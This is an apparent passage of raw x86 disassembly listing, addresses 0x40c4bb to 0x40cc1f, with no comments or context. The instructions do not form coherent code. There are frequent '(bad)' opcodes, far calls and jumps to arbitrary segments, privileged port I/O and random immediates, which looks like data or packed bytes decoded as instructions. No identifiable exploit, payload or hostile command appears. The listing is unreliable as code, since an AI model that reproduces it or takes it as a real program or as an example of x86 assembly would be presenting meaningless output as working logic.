  40c4bb:	call   0x7fa9:0x4ac7b52
  40c4c2:	add    al,0xe4
  40c4c4:	(bad)  
  40c4c5:	push   0xe0bac50b
  40c4ca:	(bad)  
  40c4cc:	sar    DWORD PTR [edi],1
  40c4ce:	inc    esi
  40c4cf:	pop    edi
  40c4d0:	adc    ecx,DWORD PTR [eax]
  40c4d2:	test   al,0xef
  40c4d4:	les    esi,FWORD PTR [edi]
  40c4d6:	sub    cl,dl
  40c4d8:	call   0x8fe0:0xc2308569
  40c4df:	test   BYTE PTR [ecx+0x5d3a36ab],al
  40c4e5:	add    BYTE PTR [edx-0x13],dh
  40c4e8:	mov    esp,0x8e91188b
  40c4ed:	lods   al,BYTE PTR ds:[esi]
  40c4ee:	(bad)  
  40c4f0:	sbb    al,0xf9
  40c4f2:	inc    ebp
  40c4f3:	jae    0x40c4e2
  40c4f5:	mov    eax,0x283588d4
  40c4fa:	inc    esp
  40c4fb:	dec    ecx
  40c4fc:	mov    esi,?
  40c4fe:	test   dh,dl
  40c500:	xchg   esi,eax
  40c501:	iret   
  40c502:	(bad)  
  40c503:	test   DWORD PTR [edx+ebx*1+0x6],ebp
  40c507:	dec    DWORD PTR [esi]
  40c509:	xchg   DWORD PTR [ecx-0x42],esp
  40c50c:	retf   
  40c50d:	in     eax,dx
  40c50e:	fs inc edi
  40c510:	xor    edi,DWORD PTR [edi-0x59]
  40c513:	cmp    BYTE PTR [edi-0x69],al
  40c516:	add    al,0xf7
  40c518:	test   BYTE PTR [edi+0x31],al
  40c51b:	pop    esp
  40c51c:	xchg   cl,ch
  40c51e:	mov    edi,0x8c80e7e5
  40c523:	sub    eax,0xd2f808a1
  40c528:	ret    
  40c529:	cld    
  40c52a:	sub    BYTE PTR [ebx-0x14],dl
  40c52d:	jmp    0x659c:0xbbbcb822
  40c534:	fsubr  QWORD PTR [edi]
  40c536:	gs iretw 
  40c539:	or     al,0xff
  40c53b:	adc    eax,0x10372ed1
  40c540:	fnstenv [edx]
  40c542:	jge    0x40c4e9
  40c544:	fadd   DWORD PTR [edx]
  40c546:	dec    eax
  40c547:	rol    BYTE PTR [esi],0xd3
  40c54a:	ds dec esi
  40c54c:	mov    ecx,0x983a8070
  40c551:	out    dx,eax
  40c552:	push   0xd1860ce4
  40c557:	push   esp
  40c558:	adc    DWORD PTR [edi+0x1ddb5106],ecx
  40c55e:	je     0x40c59a
  40c560:	adc    eax,0xc663742
  40c565:	mov    ah,0x65
  40c567:	cmp    BYTE PTR [ebx-0x48c467ab],ch
  40c56d:	(bad)  
  40c56e:	and    BYTE PTR [ebp-0x2e],bl
  40c571:	neg    bh
  40c573:	cmp    BYTE PTR [edi],ch
  40c575:	not    BYTE PTR [bx+si+0x37]
  40c579:	adc    bh,BYTE PTR [ecx]
  40c57b:	call   DWORD PTR [ebx-0x44]
  40c57e:	aas    
  40c57f:	sub    eax,0xbcbdb727
  40c584:	jp     0x40c51e
  40c586:	fsubp  st(2),st
  40c588:	mov    edi,0x25875b89
  40c58d:	dec    esp
  40c58e:	jmp    0x6030:0x1b5d4448
  40c595:	push   0x6a
  40c597:	adc    al,0xf7
  40c599:	addr16 test al,0xdc
  40c59c:	xor    eax,0xe906b1e9
  40c5a1:	ror    DWORD PTR [ebp+0x50],1
  40c5a4:	xchg   ebp,eax
  40c5a5:	and    BYTE PTR [edx-0x20],dh
  40c5a8:	in     eax,dx
  40c5a9:	ficomp WORD PTR [ebp-0x676e16e9]
  40c5af:	ins    DWORD PTR es:[edi],dx
  40c5b0:	loopne 0x40c613
  40c5b2:	outs   dx,BYTE PTR ds:[esi]
  40c5b3:	and    ebp,ebp
  40c5b5:	out    dx,al
  40c5b6:	inc    edi
  40c5b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c5b8:	enter  0x8126,0xe1
  40c5bc:	clc    
  40c5bd:	mov    ds:0x8d057dcc,eax
  40c5c2:	cli    
  40c5c3:	push   ebx
  40c5c4:	sbb    BYTE PTR [edx-0x36],bh
  40c5c7:	push   ebx
  40c5c8:	add    bl,dh
  40c5ca:	push   0x9
  40c5cc:	and    eax,0x487c00bd
  40c5d1:	dec    esi
  40c5d2:	cmp    al,0xf
  40c5d4:	pop    ecx
  40c5d5:	jo     0x40c56d
  40c5d7:	jne    0x40c622
  40c5d9:	push   es
  40c5da:	or     al,0x2
  40c5dc:	repnz in al,0xd1
  40c5df:	inc    edx
  40c5e0:	push   ss
  40c5e1:	into   
  40c5e2:	dec    eax
  40c5e3:	icebp  
  40c5e4:	push   ecx
  40c5e5:	mov    al,ds:0x54e2a67f
  40c5ea:	test   DWORD PTR [ecx],ecx
  40c5ec:	aam    0xe1
  40c5ee:	xor    DWORD PTR [ebx+0x56],ebp
  40c5f1:	inc    esp
  40c5f2:	inc    edi
  40c5f3:	cdq    
  40c5f4:	loopne 0x40c5c6
  40c5f6:	dec    eax
  40c5f7:	pop    ebx
  40c5f8:	mov    cl,0x66
  40c5fa:	fcom   DWORD PTR [ecx-0x5946063d]
  40c600:	ja     0x40c599
  40c602:	adc    eax,0x11c1a3ac
  40c607:	(bad)  
  40c609:	cdq    
  40c60a:	inc    edx
  40c60b:	inc    ecx
  40c60c:	sub    al,0xd
  40c60e:	mov    edx,?
  40c610:	stos   DWORD PTR es:[edi],eax
  40c611:	mov    esi,0x4ef0349d
  40c616:	inc    eax
  40c617:	add    edi,DWORD PTR [esi+0x2f]
  40c61a:	xor    ebp,DWORD PTR [eax]
  40c61c:	and    ch,BYTE PTR [esi+ecx*1+0x349aa7ff]
  40c623:	xor    eax,0xd1fc175d
  40c628:	icebp  
  40c629:	fidivr DWORD PTR [ebx+0x87b1aad]
  40c62f:	jae    0x40c62e
  40c631:	pop    es
  40c632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c633:	mov    dl,0x30
  40c635:	jg     0xc4d602e8
  40c63b:	imul   ebx,eax,0xa
  40c63e:	sbb    ah,BYTE PTR [ecx+0x38d98075]
  40c644:	sbb    al,0x2d
  40c646:	iret   
  40c647:	stos   BYTE PTR es:[edi],al
  40c648:	pop    es
  40c649:	ret    
  40c64a:	sbb    DWORD PTR [ebx+0x45],esi
  40c64d:	jnp    0x40c609
  40c64f:	cld    
  40c650:	and    al,0xa
  40c652:	(bad)
  40c655:	xor    eax,0x7ca4e962
  40c65a:	into   
  40c65b:	adc    BYTE PTR [edx-0x73e43b1d],ch
  40c661:	test   BYTE PTR [edx+0x426fb5ed],ch
  40c667:	mov    al,ds:0x60a9a92d
  40c66c:	xor    ah,cl
  40c66e:	jg     0x40c66c
  40c670:	push   ds
  40c671:	inc    bp
  40c673:	adc    esi,esi
  40c675:	add    BYTE PTR [ebx-0x4726d037],ah
  40c67b:	cs sub al,ah
  40c67e:	xchg   esp,eax
  40c67f:	int    0x85
  40c681:	or     BYTE PTR [ecx+0x38],bh
  40c684:	sbb    DWORD PTR [ebp+0x1d899b94],0x45
  40c68b:	push   esp
  40c68c:	or     BYTE PTR [ebp+0x9],al
  40c68f:	xchg   edx,eax
  40c690:	sbb    DWORD PTR [ebp-0x508aa251],edi
  40c696:	shl    BYTE PTR [ecx-0x23],1
  40c699:	jbe    0x40c6e5
  40c69b:	or     dl,BYTE PTR [ebx+edx*4]
  40c69e:	mov    ds:0x46501fba,eax
  40c6a3:	cmp    ecx,esp
  40c6a5:	ins    BYTE PTR es:[edi],dx
  40c6a6:	ins    DWORD PTR es:[edi],dx
  40c6a7:	mov    dh,0x43
  40c6a9:	sbb    edx,ebp
  40c6ab:	outs   dx,DWORD PTR ds:[esi]
  40c6ac:	lods   al,BYTE PTR ds:[esi]
  40c6ad:	std    
  40c6ae:	pop    eax
  40c6af:	shl    BYTE PTR [ecx],1
  40c6b1:	nop
  40c6b2:	inc    ecx
  40c6b3:	push   edi
  40c6b4:	std    
  40c6b5:	cmp    cl,BYTE PTR [edi+0x60]
  40c6b8:	xchg   ebp,eax
  40c6b9:	pop    ds
  40c6ba:	mov    ch,0x61
  40c6bc:	or     dh,cl
  40c6be:	cwde   
  40c6bf:	inc    esp
  40c6c0:	sbb    eax,esi
  40c6c2:	cmp    DWORD PTR [eax+edi*2-0x65],0xffffff8d
  40c6c7:	xor    eax,0x3e47d62e
  40c6cc:	or     al,BYTE PTR [ebp+0x689d00e2]
  40c6d2:	scas   al,BYTE PTR es:[edi]
  40c6d3:	test   ch,cl
  40c6d5:	fisttp QWORD PTR [edi+esi*4+0x51]
  40c6d9:	pop    edx
  40c6da:	and    BYTE PTR [esi-0x1b89236c],0x20
  40c6e1:	mov    WORD PTR [edi-0x4c],ds
  40c6e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c6e5:	test   al,0xde
  40c6e7:	ror    DWORD PTR [ecx],1
  40c6e9:	(bad)  
  40c6eb:	ins    DWORD PTR es:[edi],dx
  40c6ec:	xor    dh,bl
  40c6ee:	xchg   esi,eax
  40c6ef:	fs push es
  40c6f1:	and    bl,BYTE PTR ds:0x95d2fb90
  40c6f7:	pop    edi
  40c6f8:	mov    esi,0x6b2190c8
  40c6fd:	mov    WORD PTR [ecx-0x56],?
  40c700:	fwait
  40c701:	mov    DWORD PTR [esi-0x4d316c9],esi
  40c707:	popa   
  40c708:	ins    DWORD PTR es:[edi],dx
  40c709:	and    eax,0x574b3efd
  40c70e:	lahf   
  40c70f:	mov    DWORD PTR [esi],edi
  40c711:	and    al,0x28
  40c713:	mov    ds:0x14996caf,eax
  40c718:	push   0x52f752ef
  40c71d:	push   esp
  40c71e:	lods   al,BYTE PTR ds:[esi]
  40c71f:	pop    esp
  40c720:	addr16 in eax,0x7f
  40c723:	call   FWORD PTR [esi+0x7f3c3d7]
  40c729:	int    0x3c
  40c72b:	push   ss
  40c72c:	xor    eax,0x84bf40d3
  40c731:	data16 cmp al,0x3b
  40c734:	or     al,0x89
  40c736:	push   ss
  40c737:	dec    esp
  40c738:	push   ds
  40c739:	mov    ch,0x11
  40c73b:	lods   eax,DWORD PTR ds:[esi]
  40c73c:	popf   
  40c73d:	out    0xd6,al
  40c73f:	lds    ebp,FWORD PTR [ecx+0x7e]
  40c742:	mov    bl,0x90
  40c744:	shl    BYTE PTR ds:0x6024bd53,cl
  40c74a:	add    DWORD PTR [edi+esi*8],eax
  40c74d:	and    DWORD PTR [eax],0xde92af9d
  40c753:	lahf   
  40c754:	pusha  
  40c755:	cmp    ch,bh
  40c757:	bound  ebp,QWORD PTR [ebp+0x1c]
  40c75a:	sub    DWORD PTR [edi-0x55498777],edi
  40c760:	sar    esi,0xfe
  40c763:	lods   eax,DWORD PTR ds:[esi]
  40c764:	aaa    
  40c765:	jp     0x40c736
  40c767:	in     eax,dx
  40c768:	pusha  
  40c769:	mov    edx,0x3eebf156
  40c76e:	outs   dx,DWORD PTR ds:[esi]
  40c76f:	loopne 0x40c728
  40c771:	fwait
  40c772:	xchg   ecx,esp
  40c774:	xchg   edx,eax
  40c775:	xchg   esi,eax
  40c776:	jno    0x40c75a
  40c778:	or     ah,BYTE PTR [edx-0xf]
  40c77b:	xor    BYTE PTR [ebx],ah
  40c77d:	inc    ebp
  40c77e:	cmp    bh,cl
  40c780:	pop    ebp
  40c781:	out    0x1f,eax
  40c783:	add    eax,0xeafe70c1
  40c788:	addr16 xchg esp,eax
  40c78a:	xchg   ecx,eax
  40c78b:	mov    bh,0xa8
  40c78d:	sub    eax,0x96418d6f
  40c792:	pop    es
  40c793:	sbb    edi,DWORD PTR [esi+0x7d]
  40c796:	adc    eax,0x6e8ebc73
  40c79b:	stos   DWORD PTR es:[edi],eax
  40c79c:	test   DWORD PTR [edi],ecx
  40c79e:	scas   al,BYTE PTR es:[edi]
  40c79f:	mov    eax,DWORD PTR [esi-0x18]
  40c7a2:	inc    edi
  40c7a3:	or     ebx,DWORD PTR [esi]
  40c7a5:	(bad)  
  40c7a6:	outs   dx,BYTE PTR ds:[esi]
  40c7a7:	mov    bl,0x0
  40c7a9:	(bad)  
  40c7ab:	mov    ebx,ebp
  40c7ad:	push   cs
  40c7ae:	mov    edi,0x94672445
  40c7b3:	or     BYTE PTR [edx+eiz*1],dl
  40c7b6:	push   ebx
  40c7b7:	pop    ds
  40c7b8:	sub    cl,bh
  40c7ba:	jb     0x40c7a2
  40c7bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7bd:	aas    
  40c7be:	and    eax,0x2a833e0
  40c7c3:	xlat   BYTE PTR ds:[ebx]
  40c7c4:	push   ecx
  40c7c5:	sub    bh,BYTE PTR [ecx]
  40c7c7:	jne    0x40c7bf
  40c7c9:	mov    esi,0x557dfe
  40c7ce:	sbb    BYTE PTR [ebx-0x1e],dl
  40c7d1:	inc    esi
  40c7d2:	mov    bl,BYTE PTR [eax+0x7edf2f91]
  40c7d8:	sub    BYTE PTR [ebp-0x4d],dl
  40c7db:	(bad)  
  40c7dc:	rep lods al,BYTE PTR ds:[esi]
  40c7de:	(bad)  
  40c7df:	popa   
  40c7e0:	mov    edx,0xfbbd1c20
  40c7e5:	mul    BYTE PTR [eax-0x2091089c]
  40c7eb:	popa   
  40c7ec:	push   edi
  40c7ed:	mov    WORD PTR [esi+0x3a9e3755],fs
  40c7f3:	sbb    ecx,eax
  40c7f5:	jge    0x40c7e0
  40c7f7:	xchg   ecx,eax
  40c7f8:	mov    ah,0xe4
  40c7fa:	sbb    BYTE PTR [edi-0x3149cfbf],dl
  40c800:	lahf   
  40c801:	test   BYTE PTR [eax+0x75e66581],cl
  40c807:	into   
  40c808:	ds fwait
  40c80a:	jnp    0x40c7a1
  40c80c:	int    0xeb
  40c80e:	and    eax,0xb2a31c10
  40c813:	add    ch,BYTE PTR [ebp+0x6e9acda3]
  40c819:	mov    ds:0x1daff435,eax
  40c81e:	xor    bl,al
  40c820:	jo     0x40c89d
  40c822:	add    edi,DWORD PTR [edi+0x73]
  40c825:	mov    WORD PTR ds:0x61da7e00,gs
  40c82b:	and    eax,0x48097261
  40c830:	push   ebp
  40c831:	ins    BYTE PTR es:[edi],dx
  40c832:	outs   dx,DWORD PTR ds:[esi]
  40c833:	test   DWORD PTR [ebp-0x4c],ebx
  40c836:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c837:	retf   0xfcb6
  40c83a:	xchg   edi,eax
  40c83b:	fwait
  40c83c:	in     al,dx
  40c83d:	out    0x75,eax
  40c83f:	mov    ebp,0x4187bd48
  40c844:	arpl   WORD PTR [bp+di-0x5d],cx
  40c848:	cs pop ebx
  40c84a:	xor    ch,BYTE PTR [ebx+0x6b89edd2]
  40c850:	mov    ah,BYTE PTR [edx-0x17]
  40c853:	ret    
  40c854:	std    
  40c855:	aaa    
  40c856:	and    BYTE PTR es:[ebx+edx*8+0x5e731399],dh
  40c85e:	dec    eax
  40c85f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c860:	data16 loope 0x40c813
  40c863:	inc    edi
  40c864:	mov    ds:0x37ed4bbd,eax
  40c869:	mov    ah,0x65
  40c86b:	leave  
  40c86c:	jle    0x40c80b
  40c86e:	jns    0x40c8ce
  40c870:	pop    ss
  40c871:	call   0x47a493ad
  40c876:	in     al,dx
  40c877:	popa   
  40c878:	jns    0x40c8b3
  40c87a:	ins    BYTE PTR es:[edi],dx
  40c87b:	lods   eax,DWORD PTR ds:[esi]
  40c87c:	mov    eax,0x142bd571
  40c881:	pop    edx
  40c882:	jmp    0x40c868
  40c884:	leave  
  40c885:	mov    BYTE PTR [eax],ch
  40c887:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c888:	in     eax,dx
  40c889:	add    ebp,DWORD PTR [edi]
  40c88b:	mov    ds:0x1d3b48cf,eax
  40c890:	std    
  40c891:	mov    edx,0xa6fa921
  40c896:	enter  0x5b80,0x35
  40c89a:	ins    DWORD PTR es:[edi],dx
  40c89b:	or     BYTE PTR [ecx-0x11e526aa],dh
  40c8a1:	dec    edx
  40c8a2:	add    DWORD PTR [edx-0x7a8ac942],ecx
  40c8a8:	aaa    
  40c8a9:	mov    edi,0x5f8ec837
  40c8ae:	icebp  
  40c8af:	add    BYTE PTR [eax-0x5928e9a1],dl
  40c8b5:	sub    DWORD PTR [edi-0x1c],eax
  40c8b8:	call   DWORD PTR [ecx-0x1b16591e]
  40c8be:	push   es
  40c8bf:	pop    esi
  40c8c0:	adc    al,0x41
  40c8c2:	hlt    
  40c8c3:	sub    esp,DWORD PTR [eax]
  40c8c5:	repz pop ecx
  40c8c7:	pop    eax
  40c8c8:	in     al,dx
  40c8c9:	and    BYTE PTR [edi],0xd7
  40c8cc:	pop    ss
  40c8cd:	jmp    0x40c85b
  40c8cf:	std    
  40c8d0:	cmc    
  40c8d1:	xor    ebx,DWORD PTR [eax-0xe]
  40c8d4:	lahf   
  40c8d5:	add    bh,BYTE PTR [edx]
  40c8d7:	and    BYTE PTR [eax+0x285a00c5],dh
  40c8dd:	or     esi,DWORD PTR [ecx-0x48]
  40c8e0:	xor    DWORD PTR [edi+0x567f3161],esp
  40c8e6:	mov    ds:0x77884c24,eax
  40c8eb:	jecxz  0x40c8d8
  40c8ed:	xchg   edx,eax
  40c8ee:	xor    ah,dl
  40c8f0:	icebp  
  40c8f1:	sbb    al,0x90
  40c8f3:	test   eax,0x9b3bae7e
  40c8f8:	fild   QWORD PTR [edx]
  40c8fa:	xchg   ecx,eax
  40c8fb:	push   eax
  40c8fc:	xchg   BYTE PTR [edi],dh
  40c8fe:	icebp  
  40c8ff:	cmp    eax,0xabb761af
  40c904:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c905:	fs int3 
  40c907:	pop    ecx
  40c908:	adc    DWORD PTR [ebx-0x3e],esp
  40c90b:	push   edx
  40c90c:	push   0x211ff3f
  40c911:	in     al,dx
  40c912:	in     eax,dx
  40c913:	jmp    0xb7e5:0x4966d214
  40c91a:	xchg   BYTE PTR [ebp+0x3c],cl
  40c91d:	xchg   ebx,eax
  40c91e:	mov    eax,ds:0x64118d4b
  40c923:	mov    esp,0xb55f2515
  40c928:	jne    0x40c948
  40c92a:	stos   BYTE PTR es:[edi],al
  40c92b:	inc    esp
  40c92c:	rcr    ebx,cl
  40c92e:	imul   edi,edi,0x375a96c5
  40c934:	xchg   ecx,eax
  40c935:	and    eax,0x281726fd
  40c93a:	inc    ebx
  40c93b:	pop    ds
  40c93c:	inc    ebx
  40c93d:	push   ebp
  40c93e:	mov    edi,0xa93ea03a
  40c943:	dec    edx
  40c944:	scas   al,BYTE PTR es:[edi]
  40c945:	mov    esp,0xb1a438be
  40c94a:	push   es
  40c94b:	mov    cl,0x7b
  40c94d:	xor    BYTE PTR [ebx+0x4870edb9],dl
  40c953:	sbb    ch,BYTE PTR [eax+0x19]
  40c956:	imul   eax,DWORD PTR [esi-0x464205e8],0x4be6df26
  40c960:	mov    dh,0x9c
  40c962:	pop    es
  40c963:	outs   dx,BYTE PTR ds:[esi]
  40c964:	imul   edx,DWORD PTR [eax],0xfb2ce85f
  40c96a:	mov    ds:0x976e356a,al
  40c96f:	jae    0x40c986
  40c971:	sub    ch,ch
  40c973:	aaa    
  40c974:	pop    ss
  40c975:	jp     0x40c96e
  40c977:	not    BYTE PTR [ebp-0x6c0868d7]
  40c97d:	dec    eax
  40c97e:	xor    DWORD PTR [ebp+ecx*2-0x699f0657],0xffffffef
  40c986:	xor    eax,0x7c2295da
  40c98b:	test   BYTE PTR [ecx-0x73af9ab9],bl
  40c991:	stos   DWORD PTR es:[edi],eax
  40c992:	test   eax,0x1fbc1ec3
  40c997:	icebp  
  40c998:	call   FWORD PTR [ebx+0x4b]
  40c99b:	jnp    0x40c9a8
  40c99d:	nop
  40c99e:	in     eax,0x30
  40c9a0:	xchg   ebx,eax
  40c9a1:	jb     0x40c963
  40c9a3:	mov    ch,0x1f
  40c9a5:	mov    ch,0xe5
  40c9a7:	(bad)  
  40c9aa:	das    
  40c9ab:	push   0xffffffda
  40c9ad:	mov    al,ds:0x9dff3cdf
  40c9b2:	out    0x31,al
  40c9b4:	sub    eax,DWORD PTR [eax+0x3ed72af]
  40c9ba:	mov    BYTE PTR [ebx-0x30],bl
  40c9bd:	or     DWORD PTR [ebx],eax
  40c9bf:	div    BYTE PTR [ecx-0x3c]
  40c9c2:	adc    edi,ecx
  40c9c4:	pop    ebx
  40c9c5:	xchg   esp,eax
  40c9c6:	cwde   
  40c9c7:	sbb    DWORD PTR [ecx+0x2b209d6e],edi
  40c9cd:	idiv   bl
  40c9cf:	addr16 cli 
  40c9d1:	pop    edi
  40c9d2:	cmp    DWORD PTR [edi+0x3b9731d4],0x5
  40c9d9:	call   0xd3d91d95
  40c9de:	mov    esp,0xc27abe52
  40c9e3:	(bad)  [esi]
  40c9e5:	adc    DWORD PTR [esi+0x1e359045],esp
  40c9eb:	jmp    0x40ca16
  40c9ed:	xlat   BYTE PTR ds:[ebx]
  40c9ee:	adc    cl,BYTE PTR [eax+edi*4-0x10dd3c7a]
  40c9f5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9f6:	mov    ch,0x7d
  40c9f8:	dec    edi
  40c9f9:	mov    eax,ds:0xa530020e
  40c9fe:	xor    BYTE PTR [esi],al
  40ca00:	out    dx,al
  40ca01:	jnp    0x40c9f5
  40ca03:	push   es
  40ca04:	and    cl,bl
  40ca06:	popf   
  40ca07:	dec    ebp
  40ca08:	mov    ecx,0x2736fe73
  40ca0d:	stos   DWORD PTR es:[edi],eax
  40ca0e:	jl     0x40c9dc
  40ca10:	xor    BYTE PTR [edx-0x513a2dac],dh
  40ca16:	call   0x2824:0x32bdd5b5
  40ca1d:	xor    al,0x8a
  40ca1f:	and    DWORD PTR [edi],eax
  40ca21:	and    al,0xda
  40ca23:	int    0x72
  40ca25:	adc    DWORD PTR [esi-0x5b863889],eax
  40ca2b:	or     dl,BYTE PTR [ecx+0x45]
  40ca2e:	daa    
  40ca2f:	adc    al,0x47
  40ca31:	and    al,0x7f
  40ca33:	jne    0x40ca6c
  40ca35:	stos   DWORD PTR es:[edi],eax
  40ca36:	popf   
  40ca37:	and    al,0x5
  40ca39:	imul   edi,DWORD PTR [edi+0x52],0x7b
  40ca3d:	sbb    eax,0x501912f
  40ca42:	lods   al,BYTE PTR ds:[esi]
  40ca43:	mov    bl,0x9d
  40ca45:	clc    
  40ca46:	pop    ebp
  40ca47:	push   ds
  40ca48:	push   edi
  40ca49:	pop    ebx
  40ca4a:	bnd jb 0x40cab1
  40ca4d:	inc    eax
  40ca4e:	and    ch,BYTE PTR [ecx]
  40ca50:	into   
  40ca51:	cmp    edi,0xbfaaff6f
  40ca57:	mov    bl,0xc9
  40ca59:	or     BYTE PTR [edx],cl
  40ca5b:	jecxz  0x40ca96
  40ca5d:	jo     0x40ca90
  40ca5f:	sub    al,0x2f
  40ca61:	adc    eax,0x3ac57667
  40ca66:	add    ecx,DWORD PTR [ebp-0x34]
  40ca69:	mov    ds:0xc90e360b,al
  40ca6e:	ficomp DWORD PTR [esi]
  40ca70:	out    0x25,al
  40ca72:	sub    DWORD PTR [edx-0xb],ebp
  40ca75:	or     edx,DWORD PTR [ebx]
  40ca77:	jl     0x40caf2
  40ca79:	mov    BYTE PTR [edi+0x74db9686],dl
  40ca7f:	xchg   ecx,eax
  40ca80:	and    ebx,eax
  40ca82:	or     al,0x8f
  40ca84:	xor    al,ah
  40ca86:	xchg   edi,eax
  40ca87:	xchg   ecx,eax
  40ca88:	in     eax,0x4f
  40ca8a:	mov    bh,0x96
  40ca8c:	and    al,0xfe
  40ca8e:	gs clc 
  40ca90:	mov    ds:0xc521f009,eax
  40ca95:	pop    ds
  40ca96:	push   ss
  40ca97:	arpl   WORD PTR [ebx-0x7a],si
  40ca9a:	out    0x2c,eax
  40ca9c:	sbb    BYTE PTR ds:0xa528611e,0xb2
  40caa3:	imul   ebx,DWORD PTR [esi-0xd51b274],0x411cc4e8
  40caad:	dec    eax
  40caae:	sti    
  40caaf:	xchg   ebx,eax
  40cab0:	outs   dx,BYTE PTR ds:[esi]
  40cab1:	cmp    edx,DWORD PTR ds:0x264ab8b5
  40cab7:	adc    eax,0x75e59a02
  40cabc:	sub    DWORD PTR [esi-0x69],edx
  40cabf:	sbb    DWORD PTR [edi-0x7be86407],0x784bb515
  40cac9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40caca:	add    edx,edi
  40cacc:	je     0x40caee
  40cace:	popf   
  40cacf:	push   edi
  40cad0:	test   al,0x9d
  40cad2:	int3   
  40cad3:	rcl    DWORD PTR [eax+0x4b],0xe3
  40cad7:	sar    BYTE PTR [edi],1
  40cad9:	xlat   BYTE PTR ds:[ebx]
  40cada:	rol    DWORD PTR [edx],cl
  40cadc:	popa   
  40cadd:	(bad)  
  40cade:	(bad)  
  40cadf:	jb     0x40ca82
  40cae1:	jns    0x40cb58
  40cae3:	jl     0x40ca76
  40cae5:	call   0x6cd2:0xc62ecf02
  40caec:	std    
  40caed:	xchg   BYTE PTR [ebx+0x1a4e6ef0],cl
  40caf3:	jmp    0x5d9b:0x7901c1fb
  40cafa:	xchg   BYTE PTR [esi-0x38c6e84e],dh
  40cb00:	outs   dx,DWORD PTR ds:[esi]
  40cb01:	dec    ecx
  40cb02:	lahf   
  40cb03:	daa    
  40cb04:	sub    DWORD PTR ds:0xe17969b2,esi
  40cb0a:	mov    ecx,0xb2f4dde6
  40cb0f:	rol    BYTE PTR [edi-0x5b42ce12],1
  40cb15:	and    DWORD PTR [ebp+esi*4-0x6f],esi
  40cb19:	xchg   ecx,eax
  40cb1a:	xor    eax,0x86a7e0e7
  40cb1f:	lea    edi,[esi+0xc348e8]
  40cb25:	or     BYTE PTR [ebp+0x6b],cl
  40cb28:	mov    edx,0x5c9ff528
  40cb2d:	les    edi,FWORD PTR [ecx]
  40cb2f:	push   esp
  40cb30:	and    edx,DWORD PTR [eax-0x5d]
  40cb33:	sub    bl,BYTE PTR [edx]
  40cb35:	pop    eax
  40cb36:	fsub   DWORD PTR cs:[ecx+0x3599e8c4]
  40cb3d:	push   es
  40cb3e:	aaa    
  40cb3f:	(bad)  
  40cb40:	adc    al,0x29
  40cb42:	arpl   WORD PTR [ecx+0x48],ax
  40cb45:	clc    
  40cb46:	scas   al,BYTE PTR es:[edi]
  40cb47:	out    dx,al
  40cb48:	cmp    esp,DWORD PTR [eax]
  40cb4a:	popf   
  40cb4b:	pop    eax
  40cb4c:	ret    
  40cb4d:	xchg   ebx,eax
  40cb4e:	dec    ebx
  40cb4f:	push   ss
  40cb50:	cmp    BYTE PTR [esi-0x18],ah
  40cb53:	js     0x40cb20
  40cb55:	cmp    al,0xaf
  40cb57:	lahf   
  40cb58:	mov    ch,0x5d
  40cb5a:	iret   
  40cb5b:	inc    edx
  40cb5c:	dec    esp
  40cb5d:	out    dx,al
  40cb5e:	or     BYTE PTR [eax-0x41a2fb42],0xe7
  40cb65:	popw   es
  40cb67:	pop    esi
  40cb68:	xchg   esi,eax
  40cb69:	pop    edi
  40cb6a:	je     0x40cb95
  40cb6c:	sub    eax,0x217c5bd4
  40cb71:	mov    WORD PTR [edx],gs
  40cb73:	iret   
  40cb74:	mov    eax,ds:0xb0db1124
  40cb79:	jo     0x40cb29
  40cb7b:	pop    ebx
  40cb7c:	cmp    ch,bl
  40cb7e:	add    eax,0x7981f63d
  40cb83:	mov    al,0xea
  40cb85:	in     al,dx
  40cb86:	sub    BYTE PTR [eax+0x325fab07],ah
  40cb8c:	in     al,dx
  40cb8d:	jecxz  0x40cb6f
  40cb8f:	mov    al,ds:0x6ceed491
  40cb94:	icebp  
  40cb95:	fcomp  DWORD PTR [edi+0x2128f806]
  40cb9b:	int3   
  40cb9c:	imul   esp,DWORD PTR [ebx+eax*8-0x16],0x7eff6aa0
  40cba4:	adc    ebp,DWORD PTR [esi]
  40cba6:	repnz xchg esp,eax
  40cba8:	dec    esp
  40cba9:	aaa    
  40cbaa:	inc    ecx
  40cbab:	das    
  40cbac:	cs pop esi
  40cbae:	add    al,0x64
  40cbb0:	mov    al,0xda
  40cbb2:	xchg   esp,eax
  40cbb3:	dec    ebp
  40cbb4:	xlat   BYTE PTR ds:[ebx]
  40cbb5:	adc    al,0x5d
  40cbb7:	rcl    DWORD PTR [edi-0x60bccda0],1
  40cbbd:	jbe    0x40cbf4
  40cbbf:	add    eax,DWORD PTR [eax+0x16]
  40cbc2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cbc3:	xchg   ebx,eax
  40cbc4:	add    BYTE PTR [ebp+0x71f2c2ed],cl
  40cbca:	rol    DWORD PTR [ebp-0x24],1
  40cbcd:	xchg   ebp,eax
  40cbce:	dec    ebx
  40cbcf:	add    al,0xcd
  40cbd1:	dec    ebp
  40cbd2:	mov    eax,ds:0x43819eda
  40cbd7:	jns    0x40cc2f
  40cbd9:	dec    esi
  40cbda:	out    0x56,al
  40cbdc:	dec    ecx
  40cbdd:	int    0x28
  40cbdf:	inc    ebx
  40cbe0:	push   DWORD PTR [ebp-0x5f288882]
  40cbe6:	cdq    
  40cbe7:	xor    eax,0x3d18121d
  40cbec:	imul   ecx,DWORD PTR [esp+esi*2-0x80],0x99cfe2d2
  40cbf4:	jbe    0x40cbc5
  40cbf6:	dec    esi
  40cbf7:	loop   0x40cbff
  40cbf9:	pop    ds
  40cbfa:	and    BYTE PTR [edx],bh
  40cbfc:	js     0x40cbd4
  40cbfe:	retf   0x3563
  40cc01:	ja     0x40cb92
  40cc03:	mov    edi,0x80c60706
  40cc08:	mov    esp,0x2809ac24
  40cc0d:	fisttp WORD PTR [ebp-0x4ec3927]
  40cc13:	sub    DWORD PTR [ebx+0x24c8b65b],0xf9feaf21
  40cc1d:	ss pop eax
  40cc1f:	sbb    al,0x7
